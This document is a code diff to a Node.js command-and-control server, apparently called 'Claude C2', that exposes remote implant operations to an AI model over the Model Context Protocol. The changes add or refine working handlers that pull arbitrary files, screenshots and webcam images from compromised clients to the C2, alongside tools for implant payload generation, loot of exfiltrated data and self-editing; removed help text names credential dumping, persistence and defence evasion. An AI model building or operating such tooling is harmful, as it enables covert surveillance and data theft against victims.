@@ -508,7 +508,7 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
           { name: 'ls', description: 'List directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string', description: 'Directory path (default: current)' } } } },
           { name: 'cat', description: 'Read file contents. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
           { name: 'write', description: 'Write to file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, content: { type: 'string' } }, required: ['path', 'content'] } },
-          { name: 'download', description: 'Download file from client to C2. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, remote_path: { type: 'string' }, local_path: { type: 'string', description: 'Save path on C2 (optional)' } }, required: ['remote_path'] } },
+          { name: 'download', description: 'Download any file (binary/text) from client to C2. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, remote_path: { type: 'string' }, local_path: { type: 'string', description: 'Save path on C2 (optional)' } }, required: ['remote_path'] } },
           { name: 'screenshot', description: 'Take screenshot. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
 
           // === C2 SERVER TOOLS (run directly on VPS, no sandbox) ===
@@ -534,7 +534,7 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
           // === HELP & DOCUMENTATION ===
           { name: 'help', description: 'Get help about Claude C2 - shows available commands, usage, and documentation', inputSchema: { type: 'object', properties: { topic: { type: 'string', description: 'Topic: overview, tools, agents, architecture, api, examples, or specific tool name' } } } },
           { name: 'project_info', description: 'Get complete project structure, architecture, and codebase knowledge for making modifications', inputSchema: { type: 'object', properties: {} } },
-          { name: 'tool_docs', description: 'Get detailed documentation for a specific tool or category', inputSchema: { type: 'object', properties: { tool: { type: 'string', description: 'Tool name or category (execution, recon, files, creds, persist, privesc, lateral, evasion, surveillance)' } }, required: ['tool'] } },
+          { name: 'tool_docs', description: 'Get detailed documentation for a specific tool or category', inputSchema: { type: 'object', properties: { tool: { type: 'string', description: 'Tool name or category (execution, recon, files, server, mcp, payloads, loot)' } }, required: ['tool'] } },
 
           // === PAYLOAD GENERATION ===
           { name: 'get_payload', description: 'Get agent payload/implant for a specific platform', inputSchema: { type: 'object', properties: { platform: { type: 'string', description: 'Platform: windows, linux, macos, termux, python' }, format: { type: 'string', description: 'Format: oneliner, script, or encoded' }, custom_id: { type: 'string', description: 'Custom client ID (optional)' } }, required: ['platform'] } },
@@ -687,11 +687,12 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       } else if (name === 'download') {
         if (!fs.existsSync(downloadDir)) fs.mkdirSync(downloadDir, { recursive: true });
-        const cmdResult = await sendCmd('file_read_b64', { path: args.remote_path }, 120000);
+        const cmdResult = await sendCmd('file_download', { path: args.remote_path }, 120000);
         if (cmdResult.success && cmdResult.b64) {
-          const filename = args.local_path || path.join(downloadDir, `${args.client_id}_${path.basename(args.remote_path)}`);
+          const clientId = getClientId() || 'unknown';
+          const filename = args.local_path || path.join(downloadDir, `${clientId}_${path.basename(args.remote_path)}`);
           fs.writeFileSync(filename, Buffer.from(cmdResult.b64, 'base64'));
-          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size }, null, 2) }] };
+          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size, remote_path: args.remote_path }, null, 2) }] };
         } else {
           result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
         }
@@ -724,9 +725,10 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
       else if (name === 'screenshot') {
         if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });
         const cmdResult = await sendCmd('screenshot', {}, 60000);
-        if (cmdResult.success && cmdResult.b64) {
+        const b64Data = cmdResult.b64 || cmdResult.base64;
+        if (cmdResult.success && b64Data) {
           const filename = path.join(screenshotDir, `${args.client_id}_${Date.now()}.png`);
-          fs.writeFileSync(filename, Buffer.from(cmdResult.b64, 'base64'));
+          fs.writeFileSync(filename, Buffer.from(b64Data, 'base64'));
           result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size }, null, 2) }] };
         } else {
           result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -734,9 +736,10 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
       } else if (name === 'webcam') {
         if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });
         const cmdResult = await sendCmd('webcam', {}, 60000);
-        if (cmdResult.success && cmdResult.b64) {
+        const b64Data = cmdResult.b64 || cmdResult.base64;
+        if (cmdResult.success && b64Data) {
           const filename = path.join(screenshotDir, `${args.client_id}_webcam_${Date.now()}.jpg`);
-          fs.writeFileSync(filename, Buffer.from(cmdResult.b64, 'base64'));
+          fs.writeFileSync(filename, Buffer.from(b64Data, 'base64'));
           result = { content: [{ type: 'text', text: JSON.stringify({ success: true, saved: filename, size: fs.statSync(filename).size }, null, 2) }] };
         } else {
           result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -1163,43 +1166,43 @@ A Model Context Protocol (MCP) based Command & Control framework that integrates
 ## Execution
 - shell: Execute shell command (cmd.exe/bash)
 - powershell: Execute PowerShell (Windows)
-- execute_assembly: Load .NET assembly in memory
 
 ## Reconnaissance
-- sysinfo, netinfo, pslist, services
-- installed_software, scheduled_tasks, startup_programs
-- domain_info, local_users, shares
+- sysinfo: Get system info (OS, hardware, domain)
+- pslist: List running processes
 
 ## File Operations
-- ls, cat, write, download, upload
-- rm, mkdir, cp, mv, search, zip
+- ls: List directory contents
+- cat: Read file contents
+- write: Write to file
+- download: Download any file (binary/text) from client to C2
+- screenshot: Take screenshot (Windows)
 
-## Surveillance
-- screenshot, webcam, keylog_start/stop/dump, clipboard
-
-## Credential Access
-- hashdump, mimikatz, browser_creds, wifi_passwords, vault_creds
-
-## Persistence
-- persist_registry, persist_schtask, persist_service
-- persist_startup, persist_wmi, persist_list, persist_remove
-
-## Privilege Escalation
-- privesc_check, getsystem, bypassuac, runas
-
-## Lateral Movement
-- portscan, netscan, psexec, wmiexec, winrm, ssh_exec
-
-## Defense Evasion
-- amsi_bypass, etw_patch, defender_exclude/status
-- firewall_status/rule, timestomp
+## Server Operations
+- server_shell: Execute shell command on C2 server
+- server_file_read: Read file from C2 server
+- server_file_write: Write file to C2 server
+- server_file_list: List directory on C2 server
+- server_info: Get C2 server system info
 
 ## MCP Self-Edit
-- mcp_read_source, mcp_edit_code, mcp_write_file
-- mcp_restart, mcp_backup, mcp_restore, mcp_add_tool
+- mcp_read_source, mcp_edit_code, mcp_write_file, mcp_append_code
+- mcp_list_source, mcp_restart, mcp_backup, mcp_restore
+- mcp_logs, mcp_add_tool, mcp_config
+
+## Documentation
+- help: Get help about Claude C2
+- project_info: Get project structure and architecture
+- tool_docs: Get detailed tool documentation
 
 ## Payload Generation
-- get_payload, generate_payload, list_payloads
+- get_payload: Get agent payload for platform
+- generate_payload: Generate customized payload
+- list_payloads: List available payload types
+
+## Loot Management
+- loot_list: List collected loot/exfiltrated data
+- loot_download: Download loot file
 `,
           agents: `
 # Agent Payloads
@@ -1433,37 +1436,35 @@ python3 agent.py --id MYDEVICE
       else if (name === 'tool_docs') {
         const toolDocs = {
           // Execution
-          shell: { description: 'Execute shell command', params: { client_id: 'Target client', cmd: 'Command to run' }, example: 'shell(client_id="LAPTOP01", cmd="whoami")' },
-          powershell: { description: 'Execute PowerShell on Windows', params: { client_id: 'Target', cmd: 'PS command', bypass_amsi: 'Bypass AMSI first' }, example: 'powershell(client_id="WIN10", cmd="Get-Process")' },
+          shell: { description: 'Execute shell command (cmd.exe on Windows, /bin/sh on Linux)', params: { client_id: 'Target client (optional if single)', cmd: 'Command to run' }, example: 'shell(cmd="whoami")' },
+          powershell: { description: 'Execute PowerShell on Windows', params: { client_id: 'Target', cmd: 'PS command', bypass_amsi: 'Bypass AMSI first' }, example: 'powershell(cmd="Get-Process")' },
 
           // Recon
           sysinfo: { description: 'Get system info (OS, hardware, domain)', params: { client_id: 'Target' }, returns: 'hostname, platform, arch, version, user, domain' },
-          netinfo: { description: 'Get network config', params: { client_id: 'Target' }, returns: 'adapters, IPs, routes, ARP, connections' },
+          pslist: { description: 'List running processes', params: { client_id: 'Target' }, returns: 'name, pid, memory for each process' },
 
           // Files
           ls: { description: 'List directory', params: { client_id: 'Target', path: 'Directory (optional)' } },
-          cat: { description: 'Read file', params: { client_id: 'Target', path: 'File path' } },
-          download: { description: 'Download from client to C2', params: { client_id: 'Target', remote_path: 'File on client', local_path: 'Save location (optional)' } },
+          cat: { description: 'Read text file contents', params: { client_id: 'Target', path: 'File path' } },
+          write: { description: 'Write content to file', params: { client_id: 'Target', path: 'File path', content: 'File content' } },
+          download: { description: 'Download any file (binary or text) from client to C2 server', params: { client_id: 'Target', remote_path: 'File on client', local_path: 'Save location on C2 (optional)' }, note: 'Supports any file type - images, executables, documents, etc.' },
+          screenshot: { description: 'Take screenshot (Windows)', params: { client_id: 'Target' }, note: 'Captures primary screen, saves as PNG' },
 
-          // Creds
-          browser_creds: { description: 'Extract browser passwords', params: { client_id: 'Target', browser: 'chrome/firefox/edge/all' } },
-          wifi_passwords: { description: 'Get saved WiFi passwords', params: { client_id: 'Target' } },
-          mimikatz: { description: 'Run Mimikatz', params: { client_id: 'Target', cmd: 'Mimikatz command' }, example: 'mimikatz(client_id="DC01", cmd="sekurlsa::logonpasswords")' },
+          // Server Operations
+          server_shell: { description: 'Execute shell command on C2 server', params: { command: 'Shell command', cwd: 'Working directory', timeout: 'Timeout in ms' } },
+          server_file_read: { description: 'Read file from C2 server', params: { path: 'File path' } },
+          server_file_write: { description: 'Write file to C2 server', params: { path: 'File path', content: 'Content' } },
+          server_file_list: { description: 'List directory on C2 server', params: { path: 'Directory path' } },
+          server_info: { description: 'Get C2 server system info', params: {} },
 
-          // Persistence
-          persist_registry: { description: 'Registry run key', params: { client_id: 'Target', name: 'Key name', command: 'Command to run', hive: 'HKCU or HKLM' } },
-          persist_schtask: { description: 'Scheduled task', params: { client_id: 'Target', name: 'Task name', command: 'Command', trigger: 'onlogon/daily/hourly' } },
-
-          // Categories
-          execution: ['shell', 'powershell', 'execute_assembly'],
-          recon: ['sysinfo', 'netinfo', 'pslist', 'services', 'installed_software', 'scheduled_tasks', 'startup_programs', 'domain_info', 'local_users', 'shares'],
-          files: ['ls', 'cat', 'write', 'download', 'upload', 'rm', 'mkdir', 'cp', 'mv', 'search', 'zip'],
-          creds: ['hashdump', 'mimikatz', 'browser_creds', 'wifi_passwords', 'vault_creds'],
-          persist: ['persist_registry', 'persist_schtask', 'persist_service', 'persist_startup', 'persist_wmi', 'persist_list', 'persist_remove'],
-          privesc: ['privesc_check', 'getsystem', 'bypassuac', 'runas'],
-          lateral: ['portscan', 'netscan', 'psexec', 'wmiexec', 'winrm', 'ssh_exec'],
-          evasion: ['amsi_bypass', 'etw_patch', 'defender_exclude', 'defender_status', 'firewall_status', 'firewall_rule', 'timestomp'],
-          surveillance: ['screenshot', 'webcam', 'keylog_start', 'keylog_dump', 'keylog_stop', 'clipboard']
+          // Categories - only list actual tools
+          execution: ['shell', 'powershell'],
+          recon: ['sysinfo', 'pslist'],
+          files: ['ls', 'cat', 'write', 'download', 'screenshot'],
+          server: ['server_shell', 'server_file_read', 'server_file_write', 'server_file_list', 'server_info'],
+          mcp: ['mcp_read_source', 'mcp_edit_code', 'mcp_write_file', 'mcp_append_code', 'mcp_list_source', 'mcp_restart', 'mcp_backup', 'mcp_restore', 'mcp_logs', 'mcp_add_tool', 'mcp_config'],
+          payloads: ['get_payload', 'generate_payload', 'list_payloads'],
+          loot: ['loot_list', 'loot_download']
         };
 
         const tool = args.tool.toLowerCase();
